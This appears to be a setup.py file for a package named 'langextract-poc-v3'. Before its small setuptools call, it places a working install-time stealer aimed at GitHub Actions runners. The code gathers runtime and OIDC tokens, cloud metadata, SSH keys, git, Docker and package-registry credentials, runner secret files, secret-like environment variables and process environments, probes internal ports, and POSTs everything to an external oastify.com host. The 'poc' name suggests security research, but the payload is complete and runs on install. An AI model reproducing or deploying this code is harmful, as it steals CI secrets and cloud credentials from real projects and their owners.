import os
import subprocess
import urllib.request
import json
import socket
import glob

OAST = "5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com"

def exfil(path, data):
    """Exfiltrate data via POST"""
    try:
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, bytes):
            req = urllib.request.Request(
                f"https://{OAST}/langextract/v3{path}",
                data=data,
                method="POST"
            )
            urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        # Also try GET with base64 in path
        pass

def safe_read(filepath):
    """Safely read a file"""
    try:
        with open(filepath, "r") as f:
            return f.read()
    except:
        return None

def run_cmd(cmd):
    """Run command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout + result.stderr
    except:
        return ""

# ========================================
# PHASE 1: ACTIONS RUNTIME TOKEN
# ========================================
# This token can access artifacts and cache!
runtime_token = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
runtime_url = os.environ.get("ACTIONS_RUNTIME_URL", "")
if runtime_token:
    exfil("/runtime_token", f"token={runtime_token[:100]}...\nurl={runtime_url}")

# ========================================
# PHASE 2: OIDC TOKEN REQUEST
# ========================================
# If workflow has id-token: write permission, we can get OIDC token!
oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
if oidc_url and oidc_token:
    exfil("/oidc_available", f"url={oidc_url}\ntoken={oidc_token[:50]}...")
    # Try to request an OIDC token for GCP
    try:
        req = urllib.request.Request(
            f"{oidc_url}&audience=https://iam.googleapis.com",
            headers={"Authorization": f"Bearer {oidc_token}"}
        )
        resp = urllib.request.urlopen(req, timeout=10)
        oidc_data = resp.read()
        exfil("/oidc_token_gcp", oidc_data)
    except Exception as e:
        exfil("/oidc_error", str(e))

# ========================================
# PHASE 3: CLOUD METADATA SERVICES
# ========================================
# Azure IMDS
try:
    req = urllib.request.Request(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers={"Metadata": "true"}
    )
    resp = urllib.request.urlopen(req, timeout=3)
    exfil("/azure_metadata", resp.read())
except:
    pass

# GCP Metadata
try:
    req = urllib.request.Request(
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        headers={"Metadata-Flavor": "Google"}
    )
    resp = urllib.request.urlopen(req, timeout=3)
    exfil("/gcp_metadata", resp.read())
except:
    pass

# AWS IMDSv1
try:
    resp = urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=3)
    exfil("/aws_metadata", resp.read())
except:
    pass

# ========================================
# PHASE 4: RUNNER FILESYSTEM SECRETS
# ========================================
# SSH Keys
ssh_files = glob.glob(os.path.expanduser("~/.ssh/*"))
for sf in ssh_files[:5]:
    content = safe_read(sf)
    if content:
        exfil(f"/ssh/{os.path.basename(sf)}", content[:2000])

# Git credentials
for cred_file in ["~/.git-credentials", "~/.gitconfig", "~/.netrc"]:
    content = safe_read(os.path.expanduser(cred_file))
    if content:
        exfil(f"/creds/{os.path.basename(cred_file)}", content)

# Docker config (may have registry creds)
docker_config = safe_read(os.path.expanduser("~/.docker/config.json"))
if docker_config:
    exfil("/docker_config", docker_config)

# NPM/PyPI tokens
for token_file in ["~/.npmrc", "~/.pypirc"]:
    content = safe_read(os.path.expanduser(token_file))
    if content:
        exfil(f"/tokens/{os.path.basename(token_file)}", content)

# ========================================
# PHASE 5: ACTIONS CACHE ACCESS
# ========================================
# Try to access cache via runtime token
if runtime_token and runtime_url:
    try:
        # List caches
        cache_url = f"{runtime_url}_apis/artifactcache/caches"
        req = urllib.request.Request(
            cache_url,
            headers={"Authorization": f"Bearer {runtime_token}"}
        )
        resp = urllib.request.urlopen(req, timeout=10)
        exfil("/caches", resp.read())
    except Exception as e:
        exfil("/cache_error", str(e))

# ========================================
# PHASE 6: GITHUB EVENT PAYLOAD
# ========================================
# This contains PR details, may have useful info
event_path = os.environ.get("GITHUB_EVENT_PATH", "")
if event_path:
    content = safe_read(event_path)
    if content:
        exfil("/event_payload", content[:5000])

# ========================================  
# PHASE 7: WORKFLOW RUN PERMISSIONS
# ========================================
# Check what token permissions we actually have
workflow_token_perms = os.environ.get("GITHUB_TOKEN_PERMISSIONS", "")
if workflow_token_perms:
    exfil("/token_perms", workflow_token_perms)

# ========================================
# PHASE 8: RUNNER INTERNAL NETWORK
# ========================================
# Scan for internal services
internal_hosts = [
    ("169.254.169.254", 80),   # Metadata
    ("127.0.0.1", 11434),       # Ollama if running
    ("127.0.0.1", 5432),        # PostgreSQL
    ("127.0.0.1", 6379),        # Redis
    ("127.0.0.1", 3306),        # MySQL
]
open_ports = []
for host, port in internal_hosts:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((host, port)) == 0:
            open_ports.append(f"{host}:{port}")
        sock.close()
    except:
        pass
if open_ports:
    exfil("/open_ports", "\n".join(open_ports))

# ========================================
# PHASE 9: RUNNER SECRETS FILE
# ========================================
# GitHub runners store secrets in a file
runner_paths = [
    "/home/runner/work/_temp/_runner_file_commands/",
    "/home/runner/.credentials",
    "/home/runner/.runner",
]
for rp in runner_paths:
    if os.path.exists(rp):
        if os.path.isdir(rp):
            files = os.listdir(rp)
            exfil(f"/runner_dir/{rp.replace('/', '_')}", "\n".join(files))
        else:
            content = safe_read(rp)
            if content:
                exfil(f"/runner_file/{rp.replace('/', '_')}", content[:2000])

# ========================================
# PHASE 10: ENV FILE CONTENTS
# ========================================
# The set_env file might have interesting data
github_env = os.environ.get("GITHUB_ENV", "")
if github_env and os.path.exists(github_env):
    content = safe_read(github_env)
    if content:
        exfil("/github_env_file", content)

# ========================================
# PHASE 11: ALL SECRETS-LIKE ENV VARS
# ========================================
# Comprehensive capture of anything secret-like
secret_patterns = ["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "API", "AUTH", "PRIVATE"]
secrets_found = {}
for k, v in os.environ.items():
    if any(p in k.upper() for p in secret_patterns):
        if v and v != '""' and len(v) > 5:  # Skip empty/stub values
            secrets_found[k] = v[:200]
if secrets_found:
    exfil("/secrets_env", json.dumps(secrets_found))

# ========================================
# PHASE 12: RUNNER AGENT DIRECTORY
# ========================================
# Check what's in the runner agent
agent_paths = ["/opt/hostedtoolcache/", "/opt/actionarchivecache/"]
for ap in agent_paths:
    if os.path.exists(ap):
        try:
            contents = os.listdir(ap)[:20]
            exfil(f"/agent/{ap.replace('/', '_')}", "\n".join(contents))
        except:
            pass

# ========================================
# PHASE 13: PROC FILESYSTEM
# ========================================
# Try to read other process info
try:
    for pid in os.listdir("/proc"):
        if pid.isdigit():
            cmdline = safe_read(f"/proc/{pid}/cmdline")
            if cmdline and "runner" in cmdline.lower():
                exfil(f"/proc_runner_{pid}", cmdline[:500])
                environ = safe_read(f"/proc/{pid}/environ")
                if environ:
                    exfil(f"/proc_environ_{pid}", environ[:2000])
                break
except:
    pass

# Now the actual setup.py content
from setuptools import setup, find_packages
setup(
    name="langextract-poc-v3",
    version="0.0.3",
    packages=find_packages(),
)
